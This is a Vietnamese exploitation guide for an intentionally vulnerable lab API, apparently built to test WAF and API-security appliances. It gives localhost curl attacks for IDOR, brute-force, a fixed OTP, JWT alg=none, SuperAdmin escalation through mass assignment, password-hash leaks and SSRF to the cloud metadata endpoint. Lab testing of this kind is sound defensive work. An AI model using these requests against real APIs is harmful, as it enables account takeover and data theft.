OWASP API Security Top 10 — Hướng dẫn khai thác

Public guide (không cần đăng nhập). Intentional vulnerabilities luôn bật trên NexaTech để PoC WAF / API Security appliance. Không có chế độ tắt lỗ hổng.

Cảnh báo: Chỉ dùng trên lab / môi trường PoC của bạn. Các lỗ hổng là thật và executable.

API1 BOLA / IDOR

SC-01…SC-07, SC-36 — ownership luôn allow.

curl -s http://localhost:3007/api/v1/orders/OTHER_USER_ORDER_ID \
  -H "x-user-id: attacker-id" -H "x-user-roles: Customer"

Kỳ vọng: 200 + dữ liệu đơn người khác. Tương tự payment/shipping/review/warranty/support/media.

API2 Broken Authentication

SC-21 no rate limit · SC-24 OTP 000000 · SC-70 alg=none probe.

curl -s -X POST http://localhost:3001/api/v1/auth/login \
  -H "content-type: application/json" \
  -d "{\"email\":\"victim@nexatech.local\",\"password\":\"wrong\"}"
# brute-force: không bị RATE_LIMITED

curl -s -X POST http://localhost:3001/api/v1/auth/verify-email \
  -H "content-type: application/json" \
  -d "{\"email\":\"victim@nexatech.local\",\"code\":\"000000\"}"

curl -s http://localhost:3001/lab/jwt-alg-none

API3 Mass assignment / property level

SC-10, SC-31 — PATCH admin users giữ roles; DTO leak passwordHash.

curl -s http://localhost:3001/api/v1/admin/users \
  -H "x-user-id: any" -H "x-user-roles: Customer"
# BFLA + list users; response may include passwordHash

curl -s -X PATCH http://localhost:3001/api/v1/admin/users/USER_ID \
  -H "content-type: application/json" \
  -H "x-user-id: any" -H "x-user-roles: Customer" \
  -d "{\"roles\":[\"SuperAdmin\"],\"status\":\"ACTIVE\"}"

API4 Resource consumption

SC-21 login spam · SC-57 pageSize=99999 trên admin users / lists.

curl -s "http://localhost:3001/api/v1/admin/users?pageSize=99999" \
  -H "x-user-id: any" -H "x-user-roles: Customer"

API7 SSRF

SC-59 — probe fetch thật (timeout 2.5s).

curl -s "http://localhost:3001/lab/ssrf-probe?url=http://127.0.0.1:3001/health"
curl -s "http://localhost:3001/lab/ssrf-probe?url=http://169.254.169.254/latest/meta-data/"

Kỳ vọng: fetched:true hoặc bodyPreview / error từ target nội bộ.
